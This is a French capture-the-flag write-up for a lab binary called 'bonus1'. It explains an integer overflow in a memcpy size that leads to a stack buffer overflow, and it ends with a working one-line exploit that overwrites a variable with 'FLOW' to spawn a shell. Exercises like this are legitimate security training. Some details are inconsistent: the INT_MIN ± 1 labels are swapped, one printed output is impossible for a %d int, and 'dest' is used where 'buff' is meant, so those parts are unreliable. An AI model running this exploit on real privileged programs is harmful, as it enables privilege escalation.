## Bonus1

Déroulement du programme :

* un buffer de 40 octets est déclaré (disons `buff`)
* un `atoi(argv[1])` est stocké dans un `int` (disons `size`)
* si la taille de `size` est en dessous de 10
    * on copie `argv[2]` dans `buff`
    * si `size` vaut `0x574f4c46`
        * on exécute un shell


### **Objectif :** ###

`size` étant placé juste après `buffer` dans la stack on va essayer de faire un **buffer overflow** sur `buff` pour pouvoir écraser la valeur de `size`.


### **Tests :** ###

9 est la plus grande valeur qu'on peut utiliser pour pouvoir copier `argv[2]` dans `dest`, ce ne sera pas suffisant pour notre dépassement.

En observant le prototype de `memcpy` on peut remarquer que le paramètre `n` est de type `size_t` (non signé) :

```
void *memcpy(void *dest, const void *src, size_t n);
```

Caster un nombre négatif en type non signé donne généralement un très grand nombre positif, on va donc être en mesure de copier plus de 40 caractères tout en respectant les contraintes pour passer la condition.

On va chercher à overflow de 44, pour ce faire utilisons un petit programme :

```c
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char **argv)
{
    int v;

    v = atoi(argv[1]);
    printf("%d %zu\n", v, v * 4);
    return (0);
}
```

En passant `INT_MIN` au programme :

```
➜  bonus1 git:(master) ✗ ./a.out -2147483648
-2147483648 0
```

En passant `INT_MIN + 1` au programme :
```
➜  bonus1 git:(master) ✗ ./a.out -2147483649
2147483649 4294967292
```

En passant `INT_MIN - 1` au programme :
```
➜  bonus1 git:(master) ✗ ./a.out -2147483647
2147483647 4
```

En passant `INT_MIN - 2` au programme :
```
➜  bonus1 git:(master) ✗ ./a.out -2147483646
2147483646 8
```

On peut en déduire qu'à chaque fois qu'on décrémente `INT_MIN` de 1 l'output augmente de 4.

On cherche à avoir une valeur de 44 pour `size` on fait donc `INT_MIN` - 11 :

```
➜  bonus1 git:(master) ✗ ./a.out -2147483637
-2147483637 44
```

Il ne reste plus qu'à mettre `0x574f4c46` (correspondant à **"WOLF"** en **ASCII** qu'on inversera vu qu'on est en little-endian) dans `argv[2]` et le tour est joué.


### **Solution :** ###

```
./bonus1 -2147483637 $(python -c 'print("A"*40 + "FLOW")')
```